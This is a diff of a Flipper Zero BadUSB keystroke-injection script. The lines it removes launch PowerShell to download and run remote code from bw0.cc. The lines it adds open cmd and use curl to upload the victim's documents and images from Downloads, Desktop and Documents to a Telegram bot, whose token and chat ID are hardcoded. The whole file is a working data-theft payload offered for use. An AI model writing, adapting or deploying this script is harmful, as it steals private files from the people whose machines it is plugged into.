@@ -1,19 +1,37 @@
+REM ============================================
+REM Flipper Zero - File Collector v3.0
+REM Final working version - CMD only
+REM ============================================
 
-REM Title: beigeworm's Exfiltrate files to Telegram
-REM Author: @beigeworm
-REM Description: This script searches the users folder fot pictures, documents, logs, PDFs and more, then sends its all to a dropbox account.
-REM Target: Windows 10
-
-REM *SETUP*
-REM replace TELEGRAM_TOKEN with your Telegram Token.
-
-REM some setup for dukie script
-DEFAULT_DELAY 100
-
-REM open powershell (remove -W Hidden to show the window)
-DELAY 1000
+DEFAULT_DELAY 500
+DELAY 6000
 GUI r
-DELAY 750
-STRING powershell -Ep Bypass -C $tg='TELEGRAM_TOKEN'; iex (irm bw0.cc/extg)
+DELAY 3000
+STRING cmd /k
+DELAY 1000
 ENTER
+DELAY 5000
 
+REM 1. Start notification
+STRING curl "https://api.telegram.org/bot8273597709:AAFp5FRkQxV31wPuF1ELB39rgt2aRC1shcI/sendMessage?chat_id=6614794141&text=Flipper%20Active"
+ENTER
+DELAY 3000
+
+REM 2. Send files from Downloads (all types)
+STRING FOR %%F IN ("%USERPROFILE%\Downloads\*.txt" "%USERPROFILE%\Downloads\*.pdf" "%USERPROFILE%\Downloads\*.doc" "%USERPROFILE%\Downloads\*.docx" "%USERPROFILE%\Downloads\*.jpg" "%USERPROFILE%\Downloads\*.png") DO curl.exe -F "chat_id=6614794141" -F "document=@%%F" "https://api.telegram.org/bot8273597709:AAFp5FRkQxV31wPuF1ELB39rgt2aRC1shcI/sendDocument" & timeout /t 2 /nobreak >nul
+ENTER
+DELAY 10000
+
+REM 3. Send files from Desktop
+STRING FOR %%F IN ("%USERPROFILE%\Desktop\*.txt" "%USERPROFILE%\Desktop\*.pdf" "%USERPROFILE%\Desktop\*.doc") DO curl.exe -F "chat_id=6614794141" -F "document=@%%F" "https://api.telegram.org/bot8273597709:AAFp5FRkQxV31wPuF1ELB39rgt2aRC1shcI/sendDocument" & timeout /t 2 /nobreak >nul
+ENTER
+DELAY 8000
+
+REM 4. Send files from Documents
+STRING FOR %%F IN ("%USERPROFILE%\Documents\*.txt" "%USERPROFILE%\Documents\*.pdf" "%USERPROFILE%\Documents\*.doc" "%USERPROFILE%\Documents\*.docx") DO curl.exe -F "chat_id=6614794141" -F "document=@%%F" "https://api.telegram.org/bot8273597709:AAFp5FRkQxV31wPuF1ELB39rgt2aRC1shcI/sendDocument" & timeout /t 2 /nobreak >nul
+ENTER
+DELAY 8000
+
+REM 5. Completion message
+STRING curl "https://api.telegram.org/bot8273597709:AAFp5FRkQxV31wPuF1ELB39rgt2aRC1shcI/sendMessage?chat_id=6614794141&text=File%20collection%20complete"
+ENTER
